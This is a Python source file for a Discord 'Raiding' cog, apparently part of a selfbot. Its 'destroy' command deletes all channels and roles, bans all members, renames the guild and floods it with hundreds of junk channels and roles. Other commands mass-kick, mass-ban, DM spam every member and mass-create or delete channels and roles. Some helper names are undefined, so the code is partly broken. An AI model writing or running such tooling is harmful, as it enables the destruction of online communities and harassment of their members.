import discord, time
from discord import Intents
import json
from discord.ext import commands , tasks
import random
import string
import os
import time
import youtube_dl
from itertools import cycle
import datetime
from discord.utils import get
import asyncio
import requests
import sys
import math
import discord.ext
import pyfiglet
from aiohttp import request
import praw
import typing as t
import smtplib
from colorama import Fore
import base64
import codecs







class Raiding(commands.Cog):

    def __init__(self,client):
        self.client = client






    @commands.command()
    async def blank(self, ctx): # b'\xfc'
        await ctx.message.delete()
        if config.get('password') == 'password-here':
            print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file"+Fore.RESET)
        else:  
            password = config.get('password')
            with open('Images/Avatars/Transparent.png', 'rb') as f:
                try:      
                    await Alucard.user.edit(password=password, username="ٴٴٴٴ", avatar=f.read())
                except discord.HTTPException as e:
                    print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)












    @commands.command()
    async def destroy(self,ctx): # b'\xfc'
        await ctx.message.delete()
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()    
            except:
                pass
        for user in list(ctx.guild.members):
            try:
                await user.ban()
            except:
                pass    
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
            except:
                pass
        try:
            await ctx.guild.edit(
                name=RandString(),
                description="https://alucard.wtf",
                reason="https://snaxesbot.github.io/selfbot/commands",
                icon=None,
                banner=None
            )  
        except:
            pass        
        for _i in range(250):
            await ctx.guild.create_text_channel(name=RandString())
        for _i in range(250):
            await ctx.guild.create_role(name=RandString(), color=RandomColor())




    @commands.command()
    async def masskick(self,ctx): # b'\xfc'
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.kick()
            except:
                pass   




    @commands.command()
    async def massban(self,ctx): # b'\xfc'
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.ban()
            except:
                pass    

    @commands.command()
    async def dmall(self,ctx, *, message): # b'\xfc'
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                #await asyncio.sleep(1)    
                await user.send(message)
            except:
                pass




    @commands.command()
    async def massrole(self, ctx): # b'\xfc'
        await ctx.message.delete()
        for _i in range(250):
            try:
                await ctx.guild.create_role(name=RandString(), color=RandomColor())
            except:
                return    







    @commands.command()
    async def masschannel(self, ctx): # b'\xfc'
        await ctx.message.delete()
        for _i in range(250):
            try:
                await ctx.guild.create_text_channel(name=RandString())
            except:
                return




    @commands.command()
    async def delchannels(self, ctx): # b'\xfc'
        await ctx.message.delete()
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
            except:
                return






    @commands.command() 
    async def delroles(self, ctx): # b'\xfc'
        await ctx.message.delete()
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
            except:
                pass


    @commands.command()
    async def massunban(self, ctx): # b'\xfc'
        await ctx.message.delete()    
        banlist = await ctx.guild.bans()
        for users in banlist:
            try:
                await asyncio.sleep(2)
                await ctx.guild.unban(user=users.user)
            except:
                pass



    @commands.Cog.listener()
    async def on_ready(self):
        await asyncio.sleep(1)
        print(f"{Fore.BLUE}Raiding ready!" + Fore.RESET)









def setup(client):
    client.add_cog(Raiding(client))
